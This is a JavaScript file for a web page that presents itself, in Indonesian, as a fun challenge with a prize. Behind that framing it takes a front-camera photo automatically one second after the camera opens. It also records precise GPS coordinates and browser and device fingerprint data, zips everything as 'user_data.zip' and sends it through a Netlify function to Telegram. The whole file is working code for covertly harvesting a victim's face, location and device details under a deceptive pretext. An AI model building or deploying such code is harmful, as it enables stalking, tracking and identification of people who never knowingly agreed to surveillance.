// Global state
let locationData = null;
let photoData = null;
let browserInfo = null;
let isLocationGranted = false;
let isCameraGranted = false;

// DOM Elements
const permissionScreen = document.getElementById('permissionScreen');
const loadingScreen = document.getElementById('loadingScreen');
const dashboardScreen = document.getElementById('dashboardScreen');
const getLocationBtn = document.getElementById('getLocationBtn');
const capturePhotoBtn = document.getElementById('capturePhotoBtn');
const continueBtn = document.getElementById('continueBtn');
const locationBadge = document.getElementById('locationBadge');
const cameraBadge = document.getElementById('cameraBadge');
const videoPreview = document.getElementById('videoPreview');
const canvas = document.getElementById('canvas');
const loadingText = document.getElementById('loadingText');

// Collect Browser Info
function collectBrowserInfo() {
    const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
        browserName: getBrowserName(),
        browserVersion: getBrowserVersion(),
        cookieEnabled: navigator.cookieEnabled,
        onlineStatus: navigator.onLine,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
    };
    
    // Try to get IP address (will be added by netlify function)
    browserInfo = info;
    return info;
}

function getBrowserName() {
    const userAgent = navigator.userAgent;
    if (userAgent.indexOf('Firefox') > -1) return 'Firefox';
    if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) return 'Opera';
    if (userAgent.indexOf('Trident') > -1) return 'Internet Explorer';
    if (userAgent.indexOf('Edge') > -1) return 'Edge';
    if (userAgent.indexOf('Chrome') > -1) return 'Chrome';
    if (userAgent.indexOf('Safari') > -1) return 'Safari';
    return 'Unknown';
}

function getBrowserVersion() {
    const userAgent = navigator.userAgent;
    let match = userAgent.match(/(firefox|opera|chrome|safari|trident|edge)\/(\d+)/i);
    if (match) return match[2];
    return 'Unknown';
}

// Get Location
async function getLocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            reject(new Error('Geolocation is not supported by your browser'));
            return;
        }
        
        locationBadge.textContent = 'Getting...';
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date(position.timestamp).toISOString()
                };
                locationBadge.textContent = '✓';
                locationBadge.classList.add('unlocked');
                isLocationGranted = true;
                checkContinueButton();
                resolve(locationData);
            },
            (error) => {
                locationBadge.textContent = '✗';
                reject(error);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    });
}

// Capture Photo
async function capturePhoto() {
    try {
        cameraBadge.textContent = 'Getting...';
        
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            } 
        });
        
        videoPreview.srcObject = stream;
        videoPreview.style.display = 'block';
        
        // Wait for video to load
        await new Promise(resolve => {
            videoPreview.onloadedmetadata = () => {
                videoPreview.play();
                resolve();
            };
        });
        
        // Auto-capture after 1 second
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // Take photo
        canvas.width = videoPreview.videoWidth;
        canvas.height = videoPreview.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(videoPreview, 0, 0, canvas.width, canvas.height);
        
        // Convert to blob
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
        photoData = blob;
        
        // Stop camera
        stream.getTracks().forEach(track => track.stop());
        videoPreview.style.display = 'none';
        
        cameraBadge.textContent = '✓';
        cameraBadge.classList.add('unlocked');
        isCameraGranted = true;
        checkContinueButton();
        
        return photoData;
    } catch (error) {
        cameraBadge.textContent = '✗';
        videoPreview.style.display = 'none';
        throw error;
    }
}

// Check if Continue button should be enabled
function checkContinueButton() {
    if (isLocationGranted && isCameraGranted) {
        continueBtn.disabled = false;
    }
}

// Create ZIP file
async function createZipFile() {
    const zip = new JSZip();
    
    // Add photo
    if (photoData) {
        zip.file('photo.jpg', photoData);
    }
    
    // Add location
    if (locationData) {
        const locationText = `Latitude: ${locationData.latitude}\nLongitude: ${locationData.longitude}\nAccuracy: ${locationData.accuracy}m\nTimestamp: ${locationData.timestamp}`;
        zip.file('lokasi.txt', locationText);
    }
    
    // Add browser info
    if (browserInfo) {
        const infoText = Object.entries(browserInfo)
            .map(([key, value]) => `${key}: ${value}`)
            .join('\n');
        zip.file('info.txt', infoText);
    }
    
    // Generate ZIP
    const zipBlob = await zip.generateAsync({ type: 'blob' });
    return zipBlob;
}

// Send to Telegram
async function sendToTelegram(zipBlob) {
    const formData = new FormData();
    formData.append('file', zipBlob, 'user_data.zip');
    
    const response = await fetch('/.netlify/functions/send-to-telegram', {
        method: 'POST',
        body: formData
    });
    
    if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message || 'Failed to send data');
    }
    
    return await response.json();
}

// Show Dashboard
function showDashboard() {
    loadingScreen.style.display = 'none';
    dashboardScreen.style.display = 'block';
    
    // Update stats
    if (browserInfo) {
        document.getElementById('scoreData').textContent = 'Perfect 100%';
    }
    
    // Show summary
    const summaryHTML = `
        <strong>🗺️ Lokasi:</strong> ${locationData ? locationData.latitude.toFixed(4) + ', ' + locationData.longitude.toFixed(4) : 'N/A'}<br>
        <strong>📸 Foto:</strong> ${photoData ? 'Berhasil diambil (' + (photoData.size / 1024).toFixed(2) + ' KB)' : 'N/A'}<br>
        <strong>🌐 Browser:</strong> ${browserInfo ? browserInfo.browserName + ' ' + browserInfo.browserVersion : 'N/A'}<br>
        <strong>📱 Device:</strong> ${browserInfo ? browserInfo.platform : 'N/A'}<br>
        <strong>⏰ Waktu:</strong> ${new Date().toLocaleString('id-ID')}
    `;
    document.getElementById('dataSummary').innerHTML = summaryHTML;
}

// Event Listeners
getLocationBtn.addEventListener('click', async () => {
    try {
        await getLocation();
        alert('🎉 Challenge 1 Selesai! Lokasi berhasil dideteksi!');
    } catch (error) {
        alert('❌ Oops! Gagal dapat lokasi. Coba lagi ya~');
    }
});

capturePhotoBtn.addEventListener('click', async () => {
    try {
        await capturePhoto();
        alert('✨ Challenge 2 Selesai! Foto kamu keren banget!');
    } catch (error) {
        alert('❌ Oops! Gagal ambil foto. Coba lagi ya~');
    }
});

continueBtn.addEventListener('click', async () => {
    try {
        // Collect browser info
        collectBrowserInfo();
        
        // Show loading
        permissionScreen.style.display = 'none';
        loadingScreen.style.display = 'block';
        loadingText.textContent = 'Memproses hadiah...';
        
        // Create ZIP
        const zipBlob = await createZipFile();
        loadingText.textContent = 'Hampir selesai...';
        
        // Send to Telegram
        await sendToTelegram(zipBlob);
        loadingText.textContent = 'Berhasil! 🎉';
        
        // Show dashboard after delay
        await new Promise(resolve => setTimeout(resolve, 1000));
        showDashboard();
        
    } catch (error) {
        console.error('Error:', error);
        alert('❌ Oops! Ada yang error. Coba lagi ya~');
        loadingScreen.style.display = 'none';
        permissionScreen.style.display = 'block';
    }
});

// Initialize
collectBrowserInfo();
console.log('App initialized');